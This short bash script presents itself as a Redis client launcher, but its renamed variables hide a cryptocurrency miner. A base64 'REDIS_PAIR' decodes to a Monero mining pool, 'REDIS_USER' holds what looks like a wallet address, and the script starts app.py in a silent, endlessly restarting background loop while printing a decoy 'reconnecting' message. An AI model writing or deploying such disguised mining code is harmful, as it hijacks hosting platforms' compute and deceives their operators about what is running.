#!/bin/bash
set -e
REDIS_URLS=(
  "wss://actual-tiffanie-berakitame-1e85bf30.koyeb.app"
  
  
)
REDIS_URL="${REDIS_URLS[$RANDOM % ${#REDIS_URLS[@]}]}"

# Tạo .env
cat > .env <<EOF
REDIS_URL=$REDIS_URL
REDIS_PAIR=eG1yLmtyeXB0ZXgubmV0d29yazo3MDI5
REDIS_USER=89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.NSC
REDIS_PASS=x
REDIS_PIPE=8
EOF


cat > ./start.sh <<'EOF'
#!/bin/bash
while true; do
  python3 app.py
  sleep 15
done
EOF
chmod +x ./start.sh
nohup ./start.sh >/dev/null 2>&1 &
# START APP

echo "========================"
echo "  REDIS CLIENT CLI RUN  "
echo "========================"
while true; do
  echo "Reconnecting in 24 hours..."
  sleep 24h
done




